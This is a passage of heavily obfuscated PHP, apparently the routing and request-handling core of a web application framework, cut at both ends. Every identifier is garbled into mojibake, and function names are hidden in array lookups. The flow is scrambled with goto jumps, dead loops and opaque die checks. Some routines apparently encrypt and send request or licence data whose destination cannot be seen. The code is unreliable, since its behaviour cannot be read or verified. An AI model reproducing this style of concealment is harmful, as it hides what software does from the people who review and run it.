$AÌŒ™£¥Ü; $f˜±ØùŒÅ† = IO::fileSubstr($this->path, $AÌŒ™£¥Ü, $D‚¢ÇƒéÒ¶); $DØ°„Àìƒ[$AÌŒ™£¥Ü . $e©ÇÓî­Ë[33]] = $f˜±ØùŒÅ†; goto AóîÙÛ©¦; e„ƒ×ÄÅÇë: if ($C ÌŸ“­ëØ + $c§á°™¯‡§ > $CÉäª´Øù‹) { $c§á°™¯‡§ = $CÉäª´Øù‹ - $C ÌŸ“­ëØ; } if ($c§á°™¯‡§ <= 0) { return $e©ÇÓî­Ë[33]; } if ($C ÌŸ“­ëØ < 0 || $C ÌŸ“­ëØ >= $CÉäª´Øù‹ || $c§á°™¯‡§ <= 0 || $c§á°™¯‡§ > 1024 * 1024 * 5) { throw new Exception("\x69\157\106\151\154\x65\122\145\x61\x64\x20\145\162\x72\157\162\41\x20\163\164\141\162\x74\x3d{$C ÌŸ“­ëØ}\73\154\145\x6e\x67\164\x68\75{$c§á°™¯‡§}\x3b\40\x73\x69\x7a\x65\x3d{$CÉäª´Øù‹}\73"); } goto fÚ´…îœÓ; fÚ´…îœÓ: $E–‘ëñÆíá = 64 * 1024; $DØ°„Àìƒ =& self::$_chunkBuffer[$this->path]; if (!$DØ°„Àìƒ) { $DØ°„Àìƒ = array(); } goto A¦«ôÀ¡µ±; BÇ™Œ‚³ç: } private function log($bâ¬™Û°ó, $bˆô”İô¡ò) { $AåŠãš†Òù =& $_SERVER[Ö¹ñÒÁ²÷]; $fò…İï³À¥ = timeFloat() - $this->timeStart; write_log(sprintf($AåŠãš†Òù[1290], $bâ¬™Û°ó, $this->info[$AåŠãš†Òù[28]], $fò…İï³À¥, $bˆô”İô¡ò), $AåŠãš†Òù[1205]); } } goto døã°¶„Ã; C¤ÒŠ¾´¼: while ($Aä—Ã‰…‹ < $_SERVER[Ö¹ñÒÁ²÷][547]) { if ($Aä—Ã‰…‹ >= 0) { break; } $Aä—Ã‰…‹++; } class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\151\x6e\144\x65\170"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($B”¦¦ÍßÀ) { goto cÎØĞÀµç; cÎØĞÀµç: $cù•²Æ´Ó =& $_SERVER[Ö¹ñÒÁ²÷]; $F¾ƒßŠòô± =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $dí‰‰Ùö = $F¾ƒßŠòô±[0]($F¾ƒßŠòô±[1], $F¾ƒßŠòô±[2]($B”¦¦ÍßÀ, $F¾ƒßŠòô±[1])); goto c“Æ±¼ÙƒÚ; c•…çºÒ: $this->defaultAction = $dí‰‰Ùö[2] ? $dí‰‰Ùö[2] : $this->defaultAction; $bÏÉ¢¹Ìˆğ = $cù•²Æ´Ó[549]; $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][3]}($F¾ƒßŠòô±[4], array($this, $F¾ƒßŠòô±[5])); goto e«ÕËŠÓÒ; c“Æ±¼ÙƒÚ: $this->defaultModule = $dí‰‰Ùö[0] ? $dí‰‰Ùö[0] : $this->defaultModule; $this->defaultController = $dí‰‰Ùö[1] ? $dí‰‰Ùö[1] : $this->defaultController; $bæÖìÀ™ã‹ = $cù•²Æ´Ó[548]; goto c•…çºÒ; e«ÕËŠÓÒ: } public function appRun($E†Ê¾µš›) { goto DÊìŞ‘¤ƒÀ; d’ÖÔ‰àŒ…: $FÜÄ»Ğí–Ó[13](array($FÜÄ»Ğí–Ó[14], $FÜÄ»Ğí–Ó[15]), $B‹éƒ“ËÀ“ . $FÜÄ»Ğí–Ó[16], $E†Ê¾µš›); $FÜÄ»Ğí–Ó[17]($E†Ê¾µš›); $AãÙ÷…ï‘ = $e¨ëÉ”ÑÚ[554]; goto c‰éİ‘’§Ê; DÊìŞ‘¤ƒÀ: $e¨ëÉ”ÑÚ =& $_SERVER[Ö¹ñÒÁ²÷]; $FÜÄ»Ğí–Ó =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $D‰¦£Ò×Íø = $FÜÄ»Ğí–Ó[0]($FÜÄ»Ğí–Ó[1], $E†Ê¾µš›); goto aÒ‡á»èà; aÒ‡á»èà: $dñæ…°íµ = $e¨ëÉ”ÑÚ[550]; while ($dñæ…°íµ < $e¨ëÉ”ÑÚ[547]) { if ($dñæ…°íµ >= 0) { break; } $dñæ…°íµ++; } $EâÓŠƒÍçæ = $FÜÄ»Ğí–Ó[6]($D‰¦£Ò×Íø[0]); goto c·í ˆÁÕ÷; c·í ˆÁÕ÷: $B…íİ³ó÷Ê = $e¨ëÉ”ÑÚ[551]; if (strlen($B…íİ³ó÷Ê) < $e¨ëÉ”ÑÚ[552]) { return; } $B‹éƒ“ËÀ“ = $FÜÄ»Ğí–Ó[7]; goto d£Õ¤ĞÄâƒ; d£Õ¤ĞÄâƒ: $aÛéö¼À¾˜ = $e¨ëÉ”ÑÚ[553]; if (strlen($aÛéö¼À¾˜) < $e¨ëÉ”ÑÚ[552]) { die; } if ($EâÓŠƒÍçæ == $FÜÄ»Ğí–Ó[8]) { $B‹éƒ“ËÀ“ = $FÜÄ»Ğí–Ó[9]; $D‰¦£Ò×Íø[0] = $FÜÄ»Ğí–Ó[10]; $D‰¦£Ò×Íø[1] = $D‰¦£Ò×Íø[1] . $FÜÄ»Ğí–Ó[11]; $E†Ê¾µš› = $FÜÄ»Ğí–Ó[12]($FÜÄ»Ğí–Ó[1], $D‰¦£Ò×Íø); $E†Ê¾µš› = $FÜÄ»Ğí–Ó[2]($E†Ê¾µš›, $FÜÄ»Ğí–Ó[1]); } goto d’ÖÔ‰àŒ…; c‰éİ‘’§Ê: while ($AãÙ÷…ï‘ < $e¨ëÉ”ÑÚ[555]) { if ($AãÙ÷…ï‘ >= 0) { break; } $AãÙ÷…ï‘++; } $FÜÄ»Ğí–Ó[13](array($FÜÄ»Ğí–Ó[14], $FÜÄ»Ğí–Ó[15]), $B‹éƒ“ËÀ“ . $FÜÄ»Ğí–Ó[18], $E†Ê¾µš›); $aêò¿Ù‚­Î = $e¨ëÉ”ÑÚ[556]; goto BĞ»ÀÄ¤; BĞ»ÀÄ¤: } private function autorun() { $aÎŒÓõ¶½¹ =& $_SERVER[Ö¹ñÒÁ²÷]; $D‘§‡ñÙäƒ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; global $config; $E­ÍôçÚÌ = $aÎŒÓõ¶½¹[557]; if ($D‘§‡ñÙäƒ[19]($config[$D‘§‡ñÙäƒ[20]]) == 0) { return; } foreach ($config[$D‘§‡ñÙäƒ[20]] as $AáºÜ¹Ïİğ => $C¢Ó‰ò¡·­) { $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][21]}($C¢Ó‰ò¡·­); $E—÷­‡æ•Œ = $aÎŒÓõ¶½¹[558]; } } private function xcaub6fe3c6d() { goto FòÄ÷ƒ®Š; F¾Ê§©•ƒç: $eÜ‹Š˜Ë = $GLOBALS[$A¡˜ÇÅÄÑ[22]][$A¡˜ÇÅÄÑ[23]][0]; $d£°²›¡à = $d©É½­ä´„[559]; if (!$eÜ‹Š˜Ë || $A¡˜ÇÅÄÑ[24]($eÜ‹Š˜Ë) <= $A¡˜ÇÅÄÑ[24]($e­…®Ä“•Ä)) { return; } goto aè”·ĞÈ±; aè”·ĞÈ±: if ($A¡˜ÇÅÄÑ[6]($A¡˜ÇÅÄÑ[25]($eÜ‹Š˜Ë, -$A¡˜ÇÅÄÑ[24]($e­…®Ä“•Ä))) != $e­…®Ä“•Ä) { return; } $Dç„ÊÊ‡Â£ = $A¡˜ÇÅÄÑ[25]($eÜ‹Š˜Ë, 0, -$A¡˜ÇÅÄÑ[24]($e­…®Ä“•Ä)); $bµ¯ÑÇ‘Ù = $d©É½­ä´„[560]; goto Cì¬ÈÔ‹Òö; a¡¢Ä‘·Ó: $aô÷¸é¸´ = $A¡˜ÇÅÄÑ[26]($GLOBALS[$A¡˜ÇÅÄÑ[22]][$A¡˜ÇÅÄÑ[23]], 1); $Fß¶ùÎİË = $d©É½­ä´„[561]; if (!$Fß¶ùÎİË) { return; } goto FÃºÏ‰…Ù˜; FòÄ÷ƒ®Š: $d©É½­ä´„ =& $_SERVER[Ö¹ñÒÁ²÷]; $A¡˜ÇÅÄÑ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $e­…®Ä“•Ä = $A¡˜ÇÅÄÑ[8]; goto F¾Ê§©•ƒç; Cì¬ÈÔ‹Òö: if (!$bµ¯ÑÇ‘Ù) { return; } $Eé°Şˆ¦½‚ = array($A¡˜ÇÅÄÑ[8], $Dç„ÊÊ‡Â£); $B¨Ã‚´¾‰Ì = $d©É½­ä´„[550]; goto a¡¢Ä‘·Ó; FÃºÏ‰…Ù˜: $GLOBALS[$A¡˜ÇÅÄÑ[22]][$A¡˜ÇÅÄÑ[23]] = $A¡˜ÇÅÄÑ[27]($Eé°Şˆ¦½‚, $aô÷¸é¸´); $GLOBALS[$A¡˜ÇÅÄÑ[22]][$A¡˜ÇÅÄÑ[28]] = $A¡˜ÇÅÄÑ[29]($A¡˜ÇÅÄÑ[1], $GLOBALS[$A¡˜ÇÅÄÑ[22]][$A¡˜ÇÅÄÑ[23]]); goto B×´Ğ™Î·Ä; B×´Ğ™Î·Ä: } private function jrip591100d0() { goto FùĞ±ã«‰„; aÙÕâë¨¥Ù: $bÓÉÈ‡î•³ = $EíˆÊì´[33]($b¹Ÿ’™, $B™®ç§µ§‘); $e¼æÑĞ­®Ï = $B—÷ñÔ•§—[562]; if (!$e¼æÑĞ­®Ï) { return; } goto féùçÀîŒÑ; féùçÀîŒÑ: $B˜ÕÌè‘ = $EíˆÊì´[25]($b¹Ÿ’™, $bÓÉÈ‡î•³ + $EíˆÊì´[24]($B™®ç§µ§‘)); $fŠñ¿Å˜ËÑ = $B—÷ñÔ•§—[563]; if (!$fŠñ¿Å˜ËÑ) { return; } goto aÚìÏÈ¦ë—; dåŸŞÈ»“: $AÈôìĞ…›¡ = $B—÷ñÔ•§—[565]; $GLOBALS[$EíˆÊì´[22]][$EíˆÊì´[23]] = $EíˆÊì´[0]($EíˆÊì´[36], $B˜ÕÌè‘); $D£¾ç¤Í• = $B—÷ñÔ•§—[566]; goto C£­ÏïŞ„ƒ; eîÈ«Ïêƒ: $b¹Ÿ’™ = $_SERVER[$EíˆÊì´[30]]; $B™®ç§µ§‘ = $EíˆÊì´[31]; if (!$EíˆÊì´[32]($b¹Ÿ’™, $B™®ç§µ§‘)) { return; } goto aÙÕâë¨¥Ù; FùĞ±ã«‰„: $B—÷ñÔ•§— =& $_SERVER[Ö¹ñÒÁ²÷]; $EíˆÊì´ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; if ($GLOBALS[$EíˆÊì´[22]][$EíˆÊì´[28]] != $EíˆÊì´[10]) { return; } goto eîÈ«Ïêƒ; aÚìÏÈ¦ë—: $EíˆÊì´[34]($EíˆÊì´[35], $B˜ÕÌè‘, $f¡ƒ©—‡±·); $A›Ğä‚øß = $B—÷ñÔ•§—[564]; $B˜ÕÌè‘ = $EíˆÊì´[2]($f¡ƒ©—‡±·[0][0], $EíˆÊì´[36]); goto dåŸŞÈ»“; C£­ÏïŞ„ƒ: while ($D£¾ç¤Í• < $B—÷ñÔ•§—[552]) { if ($D£¾ç¤Í• >= 0) { break; } $D£¾ç¤Í•++; } $GLOBALS[$EíˆÊì´[22]][$EíˆÊì´[28]] = $EíˆÊì´[29]($EíˆÊì´[1], $GLOBALS[$EíˆÊì´[22]][$EíˆÊì´[23]]); goto AåÀ¬’‘Üà; AåÀ¬’‘Üà: } public function run() { goto f±Õóó÷‹; f±Õóó÷‹: $cî¿åùšˆŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $EŒÖÕØ†÷¸ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][37]}(); goto A¡ßƒ¯àˆÉ; DŒÕëÄ•Ø: $EŒÖÕØ†÷¸[39]($EŒÖÕØ†÷¸[41], isset($D¼™¢†±™Ö[1]) && $D¼™¢†±™Ö[0] ? $D¼™¢†±™Ö[1] : $this->defaultController); $EŒÖÕØ†÷¸[39]($EŒÖÕØ†÷¸[42], isset($D¼™¢†±™Ö[2]) && $D¼™¢†±™Ö[0] ? $D¼™¢†±™Ö[2] : $this->defaultAction); $eğ¼ÊÅë†Ø = $cî¿åùšˆŞ[570]; goto eÁ¢š¾ÁÍ; A¡ßƒ¯àˆÉ: $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][38]}(); $D¼™¢†±™Ö = $GLOBALS[$EŒÖÕØ†÷¸[22]][$EŒÖÕØ†÷¸[23]]; $e†•¾ãôƒ– = $cî¿åùšˆŞ[567]; goto CÉ©¸ò¥Ä; dØÊ„‰İÃÎ: $EŒÖÕØ†÷¸[39]($EŒÖÕØ†÷¸[40], isset($D¼™¢†±™Ö[0]) && $D¼™¢†±™Ö[0] ? $D¼™¢†±™Ö[0] : $this->defaultModule); $FÊ¹¨èĞÖ = $cî¿åùšˆŞ[569]; while ($FÊ¹¨èĞÖ < $cî¿åùšˆŞ[555]) { if ($FÊ¹¨èĞÖ >= 0) { break; } $FÊ¹¨èĞÖ++; } goto DŒÕëÄ•Ø; eÁ¢š¾ÁÍ: while ($eğ¼ÊÅë†Ø < $cî¿åùšˆŞ[555]) { if ($eğ¼ÊÅë†Ø >= 0) { break; } $eğ¼ÊÅë†Ø++; } $EŒÖÕØ†÷¸[39]($EŒÖÕØ†÷¸[43], MOD . $EŒÖÕØ†÷¸[1] . ST . $EŒÖÕØ†÷¸[1] . ACT); $bªÄ”ößâ = $cî¿åùšˆŞ[571]; goto C‹ßÏ¼ÓâÏ; C‹ßÏ¼ÓâÏ: $_SERVER[$EŒÖÕØ†÷¸[44]] = $EŒÖÕØ†÷¸[6](ACTION); $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][45]}(); if ($EŒÖÕØ†÷¸[19]($D¼™¢†±™Ö) >= 3) { $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][21]}($D¸ˆ³ËÂ¸Ë); } else { $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][21]}(ACTION); } goto d ñÅİŒ±Æ; CÉ©¸ò¥Ä: if (strlen($e†•¾ãôƒ–) < $cî¿åùšˆŞ[555]) { return; } $D¸ˆ³ËÂ¸Ë = $GLOBALS[$EŒÖÕØ†÷¸[22]][$EŒÖÕØ†÷¸[28]]; $eî¡Çùƒ¿œ = $cî¿åùšˆŞ[568]; goto dØÊ„‰İÃÎ; d ñÅİŒ±Æ: } private $sdvfd6f194bd = array(); private $decj5f0000d9 = ''; public function cejh846a3146() { goto eŸ¨æËÚ£; d¼æĞ‡â¶È: $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][49]}(); $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][50]}(); $eÏÒêÛŸÅ = $fóÕÛà°ùª[574]; goto c§Ì½¼; Cè¾µøœŒÙ: $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][48]}(); $FòŒŒŠÉœ‹ = $fóÕÛà°ùª[573]; if (!$FòŒŒŠÉœ‹) { return; } goto d¼æĞ‡â¶È; B¹ÎÂ¦œ¶Ê: if (strlen($a”‚æ‹Ñ¤) < $fóÕÛà°ùª[577]) { return; } $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][3]}($cì„èáÈ„ù[55], array($this, $cì„èáÈ„ù[56])); $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][3]}($cì„èáÈ„ù[57], array($this, $cì„èáÈ„ù[58])); goto b²ŠàÙà½; bêô‚…: $cÒÀ¾¿“î = $fóÕÛà°ùª[572]; while (strlen($cÒÀ¾¿“î) < $fóÕÛà°ùª[547]) { if (!$cÒÀ¾¿“î) { break; } $cÒÀ¾¿“î++; } $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][47]}(); goto Cè¾µøœŒÙ; b²ŠàÙà½: $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][3]}($cì„èáÈ„ù[59], array($this, $cì„èáÈ„ù[60])); $DŞâä š = $fóÕÛà°ùª[578]; if (strlen($DŞâä š) < $fóÕÛà°ùª[547]) { die; } goto Eµ©ÑÁ§¥¨; c§Ì½¼: if (!$eÏÒêÛŸÅ) { die; } $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][51]}(); $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][52]}(); goto Eñ¿ˆêšÉª; eŸ¨æËÚ£: $fóÕÛà°ùª =& $_SERVER[Ö¹ñÒÁ²÷]; $cì„èáÈ„ù =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][46]}(); goto bêô‚…; Eñ¿ˆêšÉª: $Fô°¥ãŞ¢Â = $fóÕÛà°ùª[575]; $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][3]}($cì„èáÈ„ù[53], array($this, $cì„èáÈ„ù[54])); $a”‚æ‹Ñ¤ = $fóÕÛà°ùª[576]; goto B¹ÎÂ¦œ¶Ê; Eµ©ÑÁ§¥¨: } public function sayta7ccef86($c˜÷îšà) { goto f…İÕ³ƒ£¡; f½µšØ…µ½: $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[120]] = $this->decj5f0000d9; if ($F®¤“¡íÑ½[$bÎèÕ™åğ[120]] != $bÎèÕ™åğ[121]) { $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[122]] = $F®¤“¡íÑ½[$bÎèÕ™åğ[122]]; $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[123]] = $F®¤“¡íÑ½[$bÎèÕ™åğ[123]]; $f…‡ŠÛõõ = $bÎèÕ™åğ[124](10) . $this->decj5f0000d9 . $bÎèÕ™åğ[124](5); $c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[125]][$bÎèÕ™åğ[126]] = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][127]}($f…‡ŠÛõõ, $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[113]]); } if ($this->decj5f0000d9 == $bÎèÕ™åğ[121]) { $c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[94]][$bÎèÕ™åğ[99]][$bÎèÕ™åğ[107]] = 0; } goto d³Üù–‚¨ ; A«ğè…Ú‡œ: $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[113]] = $bÎèÕ™åğ[114]($_SERVER[$bÎèÕ™åğ[115]] . $F®¤“¡íÑ½[$bÎèÕ™åğ[116]]); $C‡ŒÓ¦ô® = $B×òÓ¤Ì…±[583]; $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[117]] = $bÎèÕ™åğ[118]($bÎèÕ™åğ[119]()); goto f½µšØ…µ½; bÈœ×”–ÎÆ: $fš‚áÅåÇ¿ = $B×òÓ¤Ì…±[579]; if (strlen($fš‚áÅåÇ¿) < $B×òÓ¤Ì…±[552]) { return; } $E¯¾Ìİà = array($bÎèÕ™åğ[64], $bÎèÕ™åğ[65], $bÎèÕ™åğ[66], $bÎèÕ™åğ[67], $bÎèÕ™åğ[68], $bÎèÕ™åğ[69], $bÎèÕ™åğ[70], $bÎèÕ™åğ[71], $bÎèÕ™åğ[72], $bÎèÕ™åğ[73], $bÎèÕ™åğ[74], $bÎèÕ™åğ[75], $bÎèÕ™åğ[76], $bÎèÕ™åğ[77], $bÎèÕ™åğ[78], $bÎèÕ™åğ[79], $bÎèÕ™åğ[80], $bÎèÕ™åğ[81], $bÎèÕ™åğ[82], $bÎèÕ™åğ[83], $bÎèÕ™åğ[84], $bÎèÕ™åğ[85], $bÎèÕ™åğ[86], $bÎèÕ™åğ[87], $bÎèÕ™åğ[88], $bÎèÕ™åğ[89], $bÎèÕ™åğ[90]); goto aÙñáÀœì; BÈ¨«ß•½: if ($bÎèÕ™åğ[104]($GLOBALS, $bÎèÕ™åğ[132]) && $this->config[$bÎèÕ™åğ[133]]) { $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[134]] = WEB_ROOT; } return $c˜÷îšà; goto D¸ÜƒÅÆ´É; dÕ„‰¦»ë: while (strlen($E»¯®¼ÏÒ») < $B×òÓ¤Ì…±[577]) { if (!$E»¯®¼ÏÒ») { break; } $E»¯®¼ÏÒ»++; } unset($c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[95]][$bÎèÕ™åğ[96]]); unset($c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[95]][$bÎèÕ™åğ[97]]); goto aºã²Ëï£; aÙñáÀœì: foreach ($E¯¾Ìİà as $eŠÔàç»Ğ) { $D³ìôë£¡™ = $GLOBALS[$bÎèÕ™åğ[91]][$bÎèÕ™åğ[92]][$eŠÔàç»Ğ]; $d·©Âó­Ï = $B×òÓ¤Ì…±[580]; if (!$d·©Âó­Ï) { return; } if (isset($F®¤“¡íÑ½[$eŠÔàç»Ğ])) { $D³ìôë£¡™ = $F®¤“¡íÑ½[$eŠÔàç»Ğ]; } $c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[94]][$eŠÔàç»Ğ] = $D³ìôë£¡™; } $a¯ƒ¨ğ¦»² = $c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[94]][$bÎèÕ™åğ[76]]; $E»¯®¼ÏÒ» = $B×òÓ¤Ì…±[581]; goto dÕ„‰¦»ë; aºã²Ëï£: unset($c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[94]][$bÎèÕ™åğ[76]]); unset($c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[94]][$bÎèÕ™åğ[98]]); $bÈŠ•àŸè = $B×òÓ¤Ì…±[582]; goto aŞÎÂæÁ; f…İÕ³ƒ£¡: $B×òÓ¤Ì…± =& $_SERVER[Ö¹ñÒÁ²÷]; $bÎèÕ™åğ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $F®¤“¡íÑ½ = $bÎèÕ™åğ[61]($bÎèÕ™åğ[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}(); goto bÈœ×”–ÎÆ; d³Üù–‚¨ : $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[128]] = $bÎèÕ™åğ[104]($this->sdvfd6f194bd, $bÎèÕ™åğ[129], $bÎèÕ™åğ[10]); $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[130]] = $bÎèÕ™åğ[104]($this->sdvfd6f194bd, $bÎèÕ™åğ[131], $bÎèÕ™åğ[10]); $CÉŒÛ–ˆ‡ = $B×òÓ¤Ì…±[584]; goto BÈ¨«ß•½; aŞÎÂæÁ: while ($bÈŠ•àŸè < $B×òÓ¤Ì…±[577]) { if ($bÈŠ•àŸè >= 0) { break; } $bÈŠ•àŸè++; } $c˜÷îšà[$bÎèÕ™åğ[93]][$bÎèÕ™åğ[94]][$bÎèÕ™åğ[99]] = array($bÎèÕ™åğ[100] => (int) $a¯ƒ¨ğ¦»²[$bÎèÕ™åğ[101]], $bÎèÕ™åğ[102] => $bÎèÕ™åğ[103]($bÎèÕ™åğ[104]($a¯ƒ¨ğ¦»², $bÎèÕ™åğ[105], array())), $bÎèÕ™åğ[106] => (int) $bÎèÕ™åğ[104]($a¯ƒ¨ğ¦»², $bÎèÕ™åğ[107], 0)); $c˜÷îšà[$bÎèÕ™åğ[108]][$bÎèÕ™åğ[109]] = $bÎèÕ™åğ[110]($bÎèÕ™åğ[111])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][112]}(); goto A«ğè…Ú‡œ; D¸ÜƒÅÆ´É: } private function jrvkf1b5ff87() { goto fä¦µ¡ñÆ; fò«àƒìŠ¨: if (!$f”…„¥½È) { die; } $b½¶Ñ¯Š—ª = $bÓƒÈãƒğê[61]($bÓƒÈãƒğê[62])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][63]}(); $cßŒÅôèß× = $D‰ÅˆòÉ¹ğ[587]; goto aîç¼ùÈÄ­; DŠƒÁôœÀ§: if ($this->decj5f0000d9 == $bÓƒÈãƒğê[121]) { return; } $FÕ‚èš‚¼ = array($bÓƒÈãƒğê[153], $bÓƒÈãƒğê[154], $bÓƒÈãƒğê[155], $bÓƒÈãƒğê[156], $bÓƒÈãƒğê[157], $bÓƒÈãƒğê[158]); $f”…„¥½È = $D‰ÅˆòÉ¹ğ[586]; goto fò«àƒìŠ¨; fä¦µ¡ñÆ: $D‰ÅˆòÉ¹ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÓƒÈãƒğê =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; if ($_SERVER[$bÓƒÈãƒğê[44]] == $bÓƒÈãƒğê[135]) { $B§œÖ¯ïì = array($bÓƒÈãƒğê[120] => $this->decj5f0000d9, $bÓƒÈãƒğê[136] => $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][137]}(), $bÓƒÈãƒğê[138] => $bÓƒÈãƒğê[61]($bÓƒÈãƒğê[139])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][140]}()); if ($this->decj5f0000d9 != $bÓƒÈãƒğê[121]) { $bÔ¼ñ´«®ˆ = $bÓƒÈãƒğê[104]($this->sdvfd6f194bd, $bÓƒÈãƒğê[141]); if ($bÔ¼ñ´«®ˆ) { $B§œÖ¯ïì[$bÓƒÈãƒğê[142]] = $bÔ¼ñ´«®ˆ; $B§œÖ¯ïì[$bÓƒÈãƒğê[143]] = $bÓƒÈãƒğê[144]($bÓƒÈãƒğê[104]($this->sdvfd6f194bd, $bÓƒÈãƒğê[145])); $B§œÖ¯ïì[$bÓƒÈãƒğê[146]] = $bÓƒÈãƒğê[104]($this->sdvfd6f194bd, $bÓƒÈãƒğê[131]); } } $B§œÖ¯ïì = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($bÓƒÈãƒğê[148]($B§œÖ¯ïì), $bÓƒÈãƒğê[114]($bÓƒÈãƒğê[149])); $Aª¦–ÊİŠ = array($bÓƒÈãƒğê[150] => $B§œÖ¯ïì); $bÓƒÈãƒğê[13](array($bÓƒÈãƒğê[151], $bÓƒÈãƒğê[152]), $Aª¦–ÊİŠ); $bîÆ­›á½ = $D‰ÅˆòÉ¹ğ[585]; } goto DŠƒÁôœÀ§; D·µ‘…ˆ: $bÓƒÈãƒğê[13](array($bÓƒÈãƒğê[151], $bÓƒÈãƒğê[152]), $Aª¦–ÊİŠ); $b‡ìõÅÙİ = $D‰ÅˆòÉ¹ğ[588]; if (!$b‡ìõÅÙİ) { return; } goto e®âò±¿Ÿ; aîç¼ùÈÄ­: if (!$cßŒÅôèß×) { die; } $Aª¦–ÊİŠ = array($bÓƒÈãƒğê[159] => $b½¶Ñ¯Š—ª[$bÓƒÈãƒğê[64]], $bÓƒÈãƒğê[160] => $b½¶Ñ¯Š—ª[$bÓƒÈãƒğê[65]], $bÓƒÈãƒğê[161] => $bÓƒÈãƒğê[10]); foreach ($FÕ‚èš‚¼ as $A¥…Ğë‰µÎ) { if (!isset($b½¶Ñ¯Š—ª[$A¥…Ğë‰µÎ]) || !$b½¶Ñ¯Š—ª[$A¥…Ğë‰µÎ]) { continue; } $Aª¦–ÊİŠ[$A¥…Ğë‰µÎ] = $b½¶Ñ¯Š—ª[$A¥…Ğë‰µÎ]; } goto D·µ‘…ˆ; e®âò±¿Ÿ: } private function ihknca1c2f14() { goto e¯À´¬ö“Ó; FÛ¡†£®…: $Aï¦ê•¢“ = $DñØÎ…²à’[124](16); $bóÀ‰èÖ•Ù = $Aï¦ê•¢“ . $bè‘…®ìŞ²[$DñØÎ…²à’[120]] . $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($DñØÎ…²à’[114]($bè‘…®ìŞ²[$DñØÎ…²à’[209]]), $Aï¦ê•¢“); $bè‘…®ìŞ²[$DñØÎ…²à’[123]] = $DñØÎ…²à’[118]($DñØÎ…²à’[214]($this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($bóÀ‰èÖ•Ù, $DñØÎ…²à’[216]))); goto eËòÓé’—‰; f¼Û‘ùè×ñ: $DäŠá´ÃË = $B—Öëó®À¥[591]; while ($DäŠá´ÃË < $B—Öëó®À¥[552]) { if ($DäŠá´ÃË >= 0) { break; } $DäŠá´ÃË++; } $F¤ŒÊ…ÊÔ˜ = $DñØÎ…²à’[214]($DñØÎ…²à’[25]($CÀ“„µÚÄ, 10, 16)); goto eøĞ÷Í¢è; Eø÷¹’Ö¾š: if ($Aâ™ÏšèÒ[$DñØÎ…²à’[178]] == $DñØÎ…²à’[179]) { $aÕ„ˆ·ğ¼Â = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($cò‚Õè•óö, $DñØÎ…²à’[180]); $AÈøä“Ìæ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][127]}($DñØÎ…²à’[148]($c®Íà×„¿µ), $cò‚Õè•óö . $DñØÎ…²à’[181], 3); $BÕ´Åà™™æ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][182]}($DñØÎ…²à’[183] . $aÕ„ˆ·ğ¼Â . $DñØÎ…²à’[184] . $AÈøä“Ìæ, -1); $DñØÎ…²à’[166]($BÕ´Åà™™æ, !0); } else { if ($Aâ™ÏšèÒ[$DñØÎ…²à’[178]] == $DñØÎ…²à’[185]) { $A½ÒÜˆ„ã¥ = $DñØÎ…²à’[25]($DñØÎ…²à’[114]($DñØÎ…²à’[186] . $cò‚Õè•óö), 12, 